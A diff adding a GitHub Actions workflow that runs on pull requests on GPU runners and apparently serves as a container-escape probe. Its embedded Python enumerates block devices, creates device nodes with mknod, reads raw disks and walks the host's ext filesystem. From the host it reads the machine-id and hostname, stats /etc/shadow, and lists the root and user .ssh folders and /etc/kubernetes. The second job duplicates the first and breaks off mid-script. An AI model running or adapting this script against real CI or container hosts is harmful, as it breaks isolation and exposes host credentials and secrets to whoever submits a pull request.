@@ -1,0 +1,1138 @@
+name: c211-126602-h200fsread
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  fsread-a:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 20
+    steps:
+      - name: h200-hostfs-readonly-fsread-a
+        env:
+          NONCE: c211-126602-d9e623e54ade9f7d
+          JOBTAG: fsread-a
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200FSREAD_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 400)"
+          grep -E '^(CapEff|CapBnd|CapPrm|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          echo "APPARMOR_CURRENT=$(cat /proc/self/attr/current 2>/dev/null | head -c 120)"
+          echo "CONTAINER_MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "CONTAINER_HOSTNAME=$(hostname 2>&1 | head -c 200)"
+          echo "=== PARTITIONS ==="
+          cat /proc/partitions 2>&1 | head -40
+          echo "=== DEV_BLOCK ==="
+          echo "DEV_BLOCK_COUNT=$(ls -l /dev 2>/dev/null | grep -c '^b')"
+          ls -l /dev 2>&1 | grep '^b' | head -30
+          echo "=== GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "=== HOSTFS_PARSE ==="
+          mkdir -p /tmp/c211-126602-fs 2>/dev/null
+          if command -v python3 >/dev/null 2>&1; then
+          python3 - <<'PYEOF'
+          import os, sys, struct, hashlib, subprocess
+          
+          W = os.environ.get('C211_TEST_WORK', '/tmp/c211-126602-fs')
+          TEST_DEV = os.environ.get('C211_TEST_DEV', '')
+          try:
+              os.makedirs(W, exist_ok=True)
+          except Exception as e:
+              print('SCRATCH_FAIL %s' % e)
+          
+          
+          def sha(b):
+              return hashlib.sha256(b).hexdigest()
+          
+          
+          def classify(data):
+              if len(data) >= 0x10048 and data[0x10040:0x10048] == b'_BHRfS_M':
+                  return 'btrfs', data[0x10040:0x10048].hex()
+              if len(data) >= 4 and data[:4] == b'XFSB':
+                  return 'xfs', data[:4].hex()
+              if len(data) >= 1082 and data[1080:1082] == b'\x53\xef':
+                  return 'ext', data[1080:1082].hex()
+              if len(data) >= 0x220 and data[0x200:0x208] == b'LABELONE' and data[0x218:0x220] == b'LVM2 001':
+                  return 'lvm2_pv', data[0x200:0x220].hex()
+              if len(data) >= 0x1004 and data[0x1000:0x1004] == b'\xfc\x4e\x2b\xa9':
+                  return 'linux_raid_member', data[0x1000:0x1004].hex()
+              if len(data) >= 4096 and data[4086:4096] == b'SWAPSPACE2':
+                  return 'swap', data[4086:4096].hex()
+              if len(data) >= 0x208 and data[0x200:0x208] == b'EFI PART':
+                  return 'gpt', data[0x200:0x208].hex()
+              if len(data) >= 512 and data[510:512] == b'\x55\xaa':
+                  return 'dos_pt', data[510:512].hex()
+              return 'unknown', data[:4].hex()
+          
+          
+          devs = []
+          if TEST_DEV:
+              devs.append({'name': 'testdev', 'maj': 0, 'mi': 0, 'blocks': 256})
+              print('TEST_MODE dev=%s' % TEST_DEV)
+          else:
+              try:
+                  for ln in open('/proc/partitions'):
+                      p = ln.split()
+                      if len(p) < 4 or not p[0].isdigit():
+                          continue
+                      try:
+                          maj = int(p[0]); mi = int(p[1]); blocks = int(p[2]); name = p[3]
+                      except Exception:
+                          continue
+                      if blocks <= 0:
+                          continue
+                      devs.append({'name': name, 'maj': maj, 'mi': mi, 'blocks': blocks})
+              except Exception as e:
+                  print('PARTITIONS_FAIL %s' % e)
+          print('PARTITION_COUNT=%d' % len(devs))
+          for d in devs[:30]:
+              print('PART %s %d:%d blocks=%d' % (d['name'], d['maj'], d['mi'], d['blocks']))
+          if len(devs) > 30:
+              print('PART_MORE=%d' % (len(devs) - 30))
+          
+          
+          def prio(d):
+              n = d['name']; s = 0
+              if n.startswith('dm-'):
+                  s += 50
+              if n.startswith('md'):
+                  s += 40
+              if n.startswith('sd') or n.startswith('vd') or n.startswith('xvd') or n.startswith('nvme') or n.startswith('hd'):
+                  s += 30
+              if n[-1].isdigit() and not n.startswith('md') and not n.startswith('dm-'):
+                  s -= 15
+              return s
+          
+          
+          cands = []
+          seen = set()
+          for d in sorted(devs, key=lambda x: (-prio(x), x['blocks'])):
+              k = (d['maj'], d['mi'])
+              if k in seen:
+                  continue
+              seen.add(k)
+              cands.append(d)
+          cands = cands[:12]
+          print('CANDIDATE_COUNT=%d' % len(cands))
+          
+          
+          def node_for(d):
+              if TEST_DEV and d['name'] == 'testdev':
+                  return TEST_DEV, 'test'
+              p = '/dev/' + d['name']
+              try:
+                  st = os.stat(p)
+                  import stat as stm
+                  if stm.S_ISBLK(st.st_mode):
+                      return p, 'dev'
+              except Exception:
+                  pass
+              p2 = os.path.join(W, d['name'])
+              try:
+                  os.unlink(p2)
+              except Exception:
+                  pass
+              try:
+                  import stat as stm
+                  os.mknod(p2, stm.S_IFBLK | 0o600, os.makedev(d['maj'], d['mi']))
+                  return p2, 'mknod'
+              except Exception as e:
+                  return None, 'mknod_fail:%s' % e
+          
+          
+          rows = []
+          for d in cands:
+              node, how = node_for(d)
+              sbf = os.path.join(W, d['name'].replace('/', '_') + '.sb')
+              data = b''
+              err = ''
+              rc = -1
+              if node:
+                  try:
+                      with open(sbf, 'wb') as fo:
+                          p = subprocess.run(['timeout', '10', 'head', '-c', '131072', node],
+                                             stdout=fo, stderr=subprocess.PIPE, timeout=20)
+                      rc = p.returncode
+                      with open(sbf, 'rb') as fi:
+                          data = fi.read(131072)
+                  except Exception as e:
+                      err = str(e)[:200]
+              fs, magic = classify(data) if data else ('unreadable', '')
+              rec = {'name': d['name'], 'mm': '%d:%d' % (d['maj'], d['mi']), 'blocks': d['blocks'],
+                     'node': node, 'node_how': how, 'rc': rc, 'bytes': len(data),
+                     'fstype': fs, 'magic': magic, 'sha256': sha(data) if data else '', 'err': err}
+              if fs == 'ext' and len(data) >= 2048:
+                  sb = data[1024:2048]
+                  rec['last_mounted'] = sb[0x88:0x88 + 64].split(b'\0')[0].decode('latin1', 'replace')
+                  rec['label'] = sb[0x78:0x88].split(b'\0')[0].decode('latin1', 'replace')
+              elif fs == 'xfs' and len(data) >= 128:
+                  rec['xfs_uuid'] = data[0x20:0x30].hex()
+                  rec['xfs_fname'] = data[0x6c:0x78].split(b'\0')[0].decode('latin1', 'replace')
+              root_hint = 'yes' if rec.get('last_mounted') == '/' else ('label' if rec.get('label') else 'no')
+              rows.append(rec)
+              print('CLASS dev=%s mm=%s blocks=%d node=%s node_how=%s read_rc=%d read_bytes=%d fstype=%s magic=%s sha256=%s root_hint=%s%s' %
+                    (d['name'], rec['mm'], d['blocks'], node, how, rc, len(data), fs, magic, rec['sha256'], root_hint,
+                     (' read_err=' + err) if err else ''))
+          
+          
+          def score(r):
+              s = 0
+              if r['name'].startswith('dm-'):
+                  s += 50
+              if r['name'].startswith('md'):
+                  s += 40
+              if r.get('last_mounted') == '/':
+                  s += 1000
+              lbl = (r.get('label') or '').lower()
+              if any(k in lbl for k in ('root', 'ubuntu', 'cloudimg', 'system')):
+                  s += 100
+              if r['blocks'] <= 2000000000:
+                  s += 10
+              else:
+                  s -= 20
+              return s
+          
+          
+          recognized = [r for r in rows if r['fstype'] in ('ext', 'xfs') and r['bytes'] >= 4096]
+          recognized.sort(key=lambda r: (-score(r), r['blocks']))
+          print('RECOGNIZED_EXT_XFS=%d' % len(recognized))
+          for r in recognized:
+              print('TARGET_CANDIDATE dev=%s mm=%s fstype=%s blocks=%d score=%d' % (r['name'], r['mm'], r['fstype'], r['blocks'], score(r)))
+          
+          
+          def have(cmd):
+              for p in os.environ.get('PATH', '/usr/sbin:/usr/bin:/sbin:/bin').split(':'):
+                  fp = os.path.join(p, cmd)
+                  if os.path.isfile(fp) and os.access(fp, os.X_OK):
+                      return fp
+              return None
+          
+          
+          DEBUGFS = have('debugfs')
+          XFSDB = have('xfs_db')
+          print('TOOL_DEBUGFS=%s TOOL_XFS_DB=%s TOOL_PYTHON3=%s' % (DEBUGFS or 'absent', XFSDB or 'absent', have('python3') or 'absent'))
+          
+          
+          def parse_debugfs(node):
+              cmds = ['cat /etc/machine-id', 'cat /etc/hostname', 'stat /etc/shadow',
+                      'ls -l /etc/kubernetes', 'ls -l /root/.ssh', 'ls -l /home',
+                      'ls -l /home/runner/.ssh', 'ls -l /home/ubuntu/.ssh']
+              cf = os.path.join(W, 'dbg.cmd')
+              with open(cf, 'w') as f:
+                  f.write('\n'.join(cmds) + '\n')
+              try:
+                  p = subprocess.run([DEBUGFS, '-f', cf, node], capture_output=True, timeout=120)
+              except Exception as e:
+                  print('DEBUGFS_FAIL %s' % str(e)[:200])
+                  return False
+              out = p.stdout.decode('utf-8', 'replace')
+              err = p.stderr.decode('utf-8', 'replace')
+              err_lines = [x for x in err.split('\n') if x.strip()]
+              print('DEBUGFS_RC=%d stdout_bytes=%d stderr_first=%s' %
+                    (p.returncode, len(p.stdout), (err_lines[0][:220] if err_lines else '')))
+              sections = []
+              cur = None
+              for ln in out.split('\n'):
+                  if ln.startswith('debugfs: '):
+                      cur = [ln[len('debugfs: '):].strip(), []]
+                      sections.append(cur)
+                  elif cur is not None:
+                      cur[1].append(ln.rstrip('\r'))
+          
+              def sec(name):
+                  for cmd, lines in sections:
+                      if cmd == name:
+                          return lines
+                  return None
+          
+              proven = False
+              mid_lines = sec('cat /etc/machine-id')
+              mid = None
+              if mid_lines:
+                  cand = [x.strip() for x in mid_lines if x.strip()]
+                  if cand:
+                      mid = cand[0]
+              if mid and len(mid) == 32 and all(c in '0123456789abcdefABCDEF' for c in mid):
+                  print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' % (mid, sha((mid + '\n').encode())))
+                  proven = True
+              elif mid:
+                  print('HOSTFILE /etc/machine-id PRESENT_ODD CONTENT=%s' % mid[:128])
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              host = None
+              hl = sec('cat /etc/hostname')
+              if hl:
+                  for x in hl:
+                      s = x.strip()
+                      if s and len(s) <= 253:
+                          host = s
+                          break
+              if host:
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (host, sha((host + '\n').encode())))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              sz = None
+              sl = sec('stat /etc/shadow')
+              if sl:
+                  for ln in sl:
+                      i = ln.find('Size: ')
+                      if i >= 0:
+                          j = ln.find(' ', i + 6)
+                          sz = ln[i + 6:j if j > 0 else None].strip()
+                          break
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%s' % sz if sz is not None else 'ABSENT'))
+              import re
+              pat = re.compile(r'^\s*(\d+)\s+([0-7]{5,6})\s+\(\d+\)\s+(\d+)\s+(\d+)\s+(\d+)\s+\S+\s+\S+\s+(\S+)\s*$')
+          
+              def emit_dir(path):
+                  ls = sec('ls -l ' + path)
+                  if ls is None:
+                      print('HOSTDIR %s ABSENT' % path)
+                      return
+                  ents = []
+                  for ln in ls:
+                      m = pat.match(ln)
+                      if m:
+                          ents.append(m.group(6))
+                  names = [e for e in ents if e not in ('.', '..')]
+                  print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (path, len(names), ','.join(names[:20]) if names else '-'))
+          
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  emit_dir(d)
+              return proven
+          
+          
+          def read_exact(f, off, n):
+              f.seek(off)
+              return f.read(n)
+          
+          
+          def parse_python_ext(node):
+              MAX_FILE = 65536
+              try:
+                  f = open(node, 'rb')
+              except Exception as e:
+                  print('EXT_READER_OPEN_FAIL %s' % str(e)[:160])
+                  return False
+              sb = read_exact(f, 1024, 1024)
+              if len(sb) < 1024 or sb[56:58] != b'\x53\xef':
+                  print('EXT_READER_NOT_EXT sb_magic=%s' % (sb[56:58].hex() if len(sb) >= 58 else 'short'))
+                  return False
+              inodes_count = struct.unpack('<I', sb[0:4])[0]
+              blocks_count = struct.unpack('<I', sb[4:8])[0]
+              first_data_block = struct.unpack('<I', sb[20:24])[0]
+              log_block_size = struct.unpack('<I', sb[24:28])[0]
+              inodes_per_group = struct.unpack('<I', sb[40:44])[0]
+              rev = struct.unpack('<I', sb[76:80])[0]
+              inode_size = struct.unpack('<H', sb[88:90])[0] if rev >= 1 else 128
+              feat_incompat = struct.unpack('<I', sb[96:100])[0]
+              desc_size = struct.unpack('<H', sb[254:256])[0] if (feat_incompat & 0x80) and len(sb) >= 256 else 32
+              if desc_size < 32:
+                  desc_size = 32
+              bs = 1024 << (log_block_size & 7)
+              if inode_size < 128 or inode_size > 1024:
+                  inode_size = 128
+              print('EXT_READER sb inodes=%d blocks=%d bsize=%d ipg=%d isize=%d feat_incompat=0x%x desc_size=%d' %
+                    (inodes_count, blocks_count, bs, inodes_per_group, inode_size, feat_incompat, desc_size))
+          
+              def read_block(n):
+                  if n <= 0:
+                      return b''
+                  return read_exact(f, n * bs, bs)
+          
+              def get_inode(ino):
+                  if ino < 1:
+                      return b''
+                  g = (ino - 1) // inodes_per_group
+                  idx = (ino - 1) % inodes_per_group
+                  gd_off = (first_data_block + 1) * bs + g * desc_size
+                  gd = read_exact(f, gd_off, desc_size)
+                  if len(gd) < 12:
+                      return b''
+                  itab = struct.unpack('<I', gd[8:12])[0]
+                  if (feat_incompat & 0x80) and desc_size >= 0x2c:
+                      hi = struct.unpack('<I', gd[0x28:0x2c])[0]
+                      itab |= hi << 32
+                  return read_exact(f, itab * bs + idx * inode_size, inode_size)
+          
+              def parse_inode(raw):
+                  if len(raw) < 100:
+                      return None
+                  mode = struct.unpack('<H', raw[0:2])[0]
+                  size = struct.unpack('<I', raw[4:8])[0]
+                  flags = struct.unpack('<I', raw[32:36])[0]
+                  if (mode & 0xF000) == 0x8000:
+                      size |= struct.unpack('<I', raw[108:112])[0] << 32
+                  return {'mode': mode, 'size': size, 'flags': flags, 'iblock': raw[40:100]}
+          
+              def extent_blocks(iblock):
+                  out = []
+          
+                  def walk(node, depth_limit):
+                      if len(out) >= 4096 or depth_limit < 0 or len(node) < 12:
+                          return
+                      magic, entries, maxe, depth = struct.unpack('<HHHH', node[0:8])
+                      if magic != 0xF30A:
+                          return
+                      for i in range(min(entries, maxe, 340)):
+                          e = node[12 + i * 12:12 + (i + 1) * 12]
+                          if len(e) < 12:
+                              break
+                          ee_block, ee_len, ee_start_hi, ee_start_lo = struct.unpack('<IHHI', e)
+                          start = (ee_start_hi << 32) | ee_start_lo
+                          if depth == 0:
+                              for k in range(ee_len & 0x7FFF):
+                                  out.append(start + k)
+                                  if len(out) >= 4096:
+                                      return
+                          else:
+                              walk(read_block(start), depth_limit - 1)
+                              if len(out) >= 4096:
+                                  return
+                  walk(iblock[:60], 4)
+                  return out
+          
+              def inode_blocks(inode):
+                  ib = inode['iblock']
+                  if inode['flags'] & 0x80000:
+                      return extent_blocks(ib)
+                  out = []
+                  ptrs = struct.unpack('<15I', ib)
+                  for p in ptrs[:12]:
+                      if p:
+                          out.append(p)
+                  per = bs // 4
+          
+                  def add_indirect(blk, level):
+                      if not blk or len(out) > 4096:
+                          return
+                      data = read_block(blk)
+                      for i in range(min(per, len(data) // 4)):
+                          v = struct.unpack('<I', data[i * 4:(i + 1) * 4])[0]
+                          if not v:
+                              continue
+                          if level == 1:
+                              out.append(v)
+                          else:
+                              add_indirect(v, level - 1)
+                          if len(out) > 4096:
+                              return
+                  add_indirect(ptrs[12], 1)
+                  return out
+          
+              def read_inode_data(inode, limit=MAX_FILE):
+                  want = min(inode['size'], limit)
+                  out = b''
+                  for b in inode_blocks(inode):
+                      out += read_block(b)
+                      if len(out) >= want:
+                          break
+                  return out[:want]
+          
+              def list_dir(inode):
+                  data = read_inode_data(inode, limit=bs * 8)
+                  ents = []
+                  off = 0
+                  while off + 8 <= len(data):
+                      inum, rec_len, name_len, ftype = struct.unpack('<IHBB', data[off:off + 8])
+                      if rec_len < 8 or off + rec_len > len(data):
+                          break
+                      if inum and 0 < name_len < 256:
+                          nm = data[off + 8:off + 8 + name_len].decode('utf-8', 'replace')
+                          ents.append((nm, inum, ftype))
+                      off += rec_len
+                  return ents
+          
+              def lookup(path):
+                  cur = 2
+                  for part in [p for p in path.split('/') if p]:
+                      ino = parse_inode(get_inode(cur))
+                      if ino is None or (ino['mode'] & 0xF000) != 0x4000:
+                          return None, None
+                      found = None
+                      for nm, inum, ft in list_dir(ino):
+                          if nm == part:
+                              found = inum
+                              break
+                      if found is None:
+                          return None, None
+                      cur = found
+                  return cur, parse_inode(get_inode(cur))
+          
+              proven = False
+              ino, fi = lookup('/etc/machine-id')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  content = data.strip()
+                  if content:
+                      print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' %
+                            (content.decode('latin1', 'replace')[:128], sha(data)))
+                      proven = True
+                  else:
+                      print('HOSTFILE /etc/machine-id EMPTY')
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              ino, fi = lookup('/etc/hostname')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (data.strip().decode('latin1', 'replace')[:256], sha(data)))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              ino, fi = lookup('/etc/shadow')
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%d' % fi['size'] if (ino and fi) else 'ABSENT'))
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  ino, fi = lookup(d)
+                  if ino and fi and (fi['mode'] & 0xF000) == 0x4000:
+                      ents = [e[0] for e in list_dir(fi) if e[0] not in ('.', '..')]
+                      print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (d, len(ents), ','.join(ents[:20]) if ents else '-'))
+                      if d == '/home':
+                          for u in ents[:10]:
+                              ino2, fi2 = lookup('/home/' + u + '/.ssh')
+                              if ino2 and fi2 and (fi2['mode'] & 0xF000) == 0x4000:
+                                  ents2 = [e[0] for e in list_dir(fi2) if e[0] not in ('.', '..')]
+                                  print('HOSTDIR /home/%s/.ssh PRESENT ENTRIES=%d NAMES=%s' % (u, len(ents2), ','.join(ents2[:20]) if ents2 else '-'))
+                              else:
+                                  print('HOSTDIR /home/%s/.ssh ABSENT' % u)
+                  else:
+                      print('HOSTDIR %s ABSENT' % d)
+              try:
+                  f.close()
+              except Exception:
+                  pass
+              return proven
+          
+          
+          def parse_xfs(node):
+              if not XFSDB:
+                  print('XFS_DB_ABSENT')
+                  return False
+              try:
+                  p = subprocess.run([XFSDB, '-r', '-c', 'sb 0', '-c', 'p uuid', '-c', 'p blocksize', '-c', 'p dblocks', '-c', 'p rootino', node],
+                                     capture_output=True, timeout=90)
+              except Exception as e:
+                  print('XFS_DB_FAIL %s' % str(e)[:200])
+                  return False
+              txt = p.stdout.decode('utf-8', 'replace')
+              print('XFS_DB_RC=%d' % p.returncode)
+              for ln in txt.split('\n')[:24]:
+                  ln = ln.strip()
+                  if ln:
+                      print('XFS_DB_LINE=%s' % ln[:200])
+              return False
+          
+          
+          proven_any = False
+          attempts = 0
+          for r in recognized:
+              if proven_any or attempts >= 2:
+                  break
+              attempts += 1
+              node = r['node']
+              if not node:
+                  print('PARSE_SKIP dev=%s reason=no_node' % r['name'])
+                  continue
+              print('PARSE_BEGIN dev=%s fstype=%s method=%s' % (r['name'], r['fstype'],
+                    'debugfs' if (r['fstype'] == 'ext' and DEBUGFS) else ('python_ext' if r['fstype'] == 'ext' else 'xfs_db')))
+              if r['fstype'] == 'ext':
+                  if DEBUGFS:
+                      ok = parse_debugfs(node)
+                      method = 'debugfs'
+                  else:
+                      ok = parse_python_ext(node)
+                      method = 'python_ext'
+              else:
+                  ok = parse_xfs(node)
+                  method = 'xfs_db'
+              print('HOSTFS_VERDICT dev=%s fstype=%s method=%s machine_id_read=%s' %
+                    (r['name'], r['fstype'], method, 'yes' if ok else 'no'))
+              if ok:
+                  proven_any = True
+          
+          print('READONLY_NOTE no_mount=yes no_device_write=yes scratch=%s' % W)
+          print('HOST_ROOT_READ_%s' % ('PROVEN' if proven_any else 'NOT_PROVEN'))
+          print('DRIVER_DONE')
+          PYEOF
+          else
+            echo PYTHON3_ABSENT_HOSTFS_PARSE_SKIPPED
+          fi
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_H200FSREAD_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  fsread-b:
+    runs-on: "8-gpu-h200"
+    timeout-minutes: 20
+    steps:
+      - name: h200-hostfs-readonly-fsread-b
+        env:
+          NONCE: c211-126602-d9e623e54ade9f7d
+          JOBTAG: fsread-b
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_H200FSREAD_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 400)"
+          grep -E '^(CapEff|CapBnd|CapPrm|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          echo "APPARMOR_CURRENT=$(cat /proc/self/attr/current 2>/dev/null | head -c 120)"
+          echo "CONTAINER_MACHINE_ID_SHA256=$(sha256sum /etc/machine-id 2>/dev/null | cut -d' ' -f1)"
+          echo "CONTAINER_HOSTNAME=$(hostname 2>&1 | head -c 200)"
+          echo "=== PARTITIONS ==="
+          cat /proc/partitions 2>&1 | head -40
+          echo "=== DEV_BLOCK ==="
+          echo "DEV_BLOCK_COUNT=$(ls -l /dev 2>/dev/null | grep -c '^b')"
+          ls -l /dev 2>&1 | grep '^b' | head -30
+          echo "=== GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version --format=csv,noheader 2>&1 | head -16
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "=== HOSTFS_PARSE ==="
+          mkdir -p /tmp/c211-126602-fs 2>/dev/null
+          if command -v python3 >/dev/null 2>&1; then
+          python3 - <<'PYEOF'
+          import os, sys, struct, hashlib, subprocess
+          
+          W = os.environ.get('C211_TEST_WORK', '/tmp/c211-126602-fs')
+          TEST_DEV = os.environ.get('C211_TEST_DEV', '')
+          try:
+              os.makedirs(W, exist_ok=True)
+          except Exception as e:
+              print('SCRATCH_FAIL %s' % e)
+          
+          
+          def sha(b):
+              return hashlib.sha256(b).hexdigest()
+          
+          
+          def classify(data):
+              if len(data) >= 0x10048 and data[0x10040:0x10048] == b'_BHRfS_M':
+                  return 'btrfs', data[0x10040:0x10048].hex()
+              if len(data) >= 4 and data[:4] == b'XFSB':
+                  return 'xfs', data[:4].hex()
+              if len(data) >= 1082 and data[1080:1082] == b'\x53\xef':
+                  return 'ext', data[1080:1082].hex()
+              if len(data) >= 0x220 and data[0x200:0x208] == b'LABELONE' and data[0x218:0x220] == b'LVM2 001':
+                  return 'lvm2_pv', data[0x200:0x220].hex()
+              if len(data) >= 0x1004 and data[0x1000:0x1004] == b'\xfc\x4e\x2b\xa9':
+                  return 'linux_raid_member', data[0x1000:0x1004].hex()
+              if len(data) >= 4096 and data[4086:4096] == b'SWAPSPACE2':
+                  return 'swap', data[4086:4096].hex()
+              if len(data) >= 0x208 and data[0x200:0x208] == b'EFI PART':
+                  return 'gpt', data[0x200:0x208].hex()
+              if len(data) >= 512 and data[510:512] == b'\x55\xaa':
+                  return 'dos_pt', data[510:512].hex()
+              return 'unknown', data[:4].hex()
+          
+          
+          devs = []
+          if TEST_DEV:
+              devs.append({'name': 'testdev', 'maj': 0, 'mi': 0, 'blocks': 256})
+              print('TEST_MODE dev=%s' % TEST_DEV)
+          else:
+              try:
+                  for ln in open('/proc/partitions'):
+                      p = ln.split()
+                      if len(p) < 4 or not p[0].isdigit():
+                          continue
+                      try:
+                          maj = int(p[0]); mi = int(p[1]); blocks = int(p[2]); name = p[3]
+                      except Exception:
+                          continue
+                      if blocks <= 0:
+                          continue
+                      devs.append({'name': name, 'maj': maj, 'mi': mi, 'blocks': blocks})
+              except Exception as e:
+                  print('PARTITIONS_FAIL %s' % e)
+          print('PARTITION_COUNT=%d' % len(devs))
+          for d in devs[:30]:
+              print('PART %s %d:%d blocks=%d' % (d['name'], d['maj'], d['mi'], d['blocks']))
+          if len(devs) > 30:
+              print('PART_MORE=%d' % (len(devs) - 30))
+          
+          
+          def prio(d):
+              n = d['name']; s = 0
+              if n.startswith('dm-'):
+                  s += 50
+              if n.startswith('md'):
+                  s += 40
+              if n.startswith('sd') or n.startswith('vd') or n.startswith('xvd') or n.startswith('nvme') or n.startswith('hd'):
+                  s += 30
+              if n[-1].isdigit() and not n.startswith('md') and not n.startswith('dm-'):
+                  s -= 15
+              return s
+          
+          
+          cands = []
+          seen = set()
+          for d in sorted(devs, key=lambda x: (-prio(x), x['blocks'])):
+              k = (d['maj'], d['mi'])
+              if k in seen:
+                  continue
+              seen.add(k)
+              cands.append(d)
+          cands = cands[:12]
+          print('CANDIDATE_COUNT=%d' % len(cands))
+          
+          
+          def node_for(d):
+              if TEST_DEV and d['name'] == 'testdev':
+                  return TEST_DEV, 'test'
+              p = '/dev/' + d['name']
+              try:
+                  st = os.stat(p)
+                  import stat as stm
+                  if stm.S_ISBLK(st.st_mode):
+                      return p, 'dev'
+              except Exception:
+                  pass
+              p2 = os.path.join(W, d['name'])
+              try:
+                  os.unlink(p2)
+              except Exception:
+                  pass
+              try:
+                  import stat as stm
+                  os.mknod(p2, stm.S_IFBLK | 0o600, os.makedev(d['maj'], d['mi']))
+                  return p2, 'mknod'
+              except Exception as e:
+                  return None, 'mknod_fail:%s' % e
+          
+          
+          rows = []
+          for d in cands:
+              node, how = node_for(d)
+              sbf = os.path.join(W, d['name'].replace('/', '_') + '.sb')
+              data = b''
+              err = ''
+              rc = -1
+              if node:
+                  try:
+                      with open(sbf, 'wb') as fo:
+                          p = subprocess.run(['timeout', '10', 'head', '-c', '131072', node],
+                                             stdout=fo, stderr=subprocess.PIPE, timeout=20)
+                      rc = p.returncode
+                      with open(sbf, 'rb') as fi:
+                          data = fi.read(131072)
+                  except Exception as e:
+                      err = str(e)[:200]
+              fs, magic = classify(data) if data else ('unreadable', '')
+              rec = {'name': d['name'], 'mm': '%d:%d' % (d['maj'], d['mi']), 'blocks': d['blocks'],
+                     'node': node, 'node_how': how, 'rc': rc, 'bytes': len(data),
+                     'fstype': fs, 'magic': magic, 'sha256': sha(data) if data else '', 'err': err}
+              if fs == 'ext' and len(data) >= 2048:
+                  sb = data[1024:2048]
+                  rec['last_mounted'] = sb[0x88:0x88 + 64].split(b'\0')[0].decode('latin1', 'replace')
+                  rec['label'] = sb[0x78:0x88].split(b'\0')[0].decode('latin1', 'replace')
+              elif fs == 'xfs' and len(data) >= 128:
+                  rec['xfs_uuid'] = data[0x20:0x30].hex()
+                  rec['xfs_fname'] = data[0x6c:0x78].split(b'\0')[0].decode('latin1', 'replace')
+              root_hint = 'yes' if rec.get('last_mounted') == '/' else ('label' if rec.get('label') else 'no')
+              rows.append(rec)
+              print('CLASS dev=%s mm=%s blocks=%d node=%s node_how=%s read_rc=%d read_bytes=%d fstype=%s magic=%s sha256=%s root_hint=%s%s' %
+                    (d['name'], rec['mm'], d['blocks'], node, how, rc, len(data), fs, magic, rec['sha256'], root_hint,
+                     (' read_err=' + err) if err else ''))
+          
+          
+          def score(r):
+              s = 0
+              if r['name'].startswith('dm-'):
+                  s += 50
+              if r['name'].startswith('md'):
+                  s += 40
+              if r.get('last_mounted') == '/':
+                  s += 1000
+              lbl = (r.get('label') or '').lower()
+              if any(k in lbl for k in ('root', 'ubuntu', 'cloudimg', 'system')):
+                  s += 100
+              if r['blocks'] <= 2000000000:
+                  s += 10
+              else:
+                  s -= 20
+              return s
+          
+          
+          recognized = [r for r in rows if r['fstype'] in ('ext', 'xfs') and r['bytes'] >= 4096]
+          recognized.sort(key=lambda r: (-score(r), r['blocks']))
+          print('RECOGNIZED_EXT_XFS=%d' % len(recognized))
+          for r in recognized:
+              print('TARGET_CANDIDATE dev=%s mm=%s fstype=%s blocks=%d score=%d' % (r['name'], r['mm'], r['fstype'], r['blocks'], score(r)))
+          
+          
+          def have(cmd):
+              for p in os.environ.get('PATH', '/usr/sbin:/usr/bin:/sbin:/bin').split(':'):
+                  fp = os.path.join(p, cmd)
+                  if os.path.isfile(fp) and os.access(fp, os.X_OK):
+                      return fp
+              return None
+          
+          
+          DEBUGFS = have('debugfs')
+          XFSDB = have('xfs_db')
+          print('TOOL_DEBUGFS=%s TOOL_XFS_DB=%s TOOL_PYTHON3=%s' % (DEBUGFS or 'absent', XFSDB or 'absent', have('python3') or 'absent'))
+          
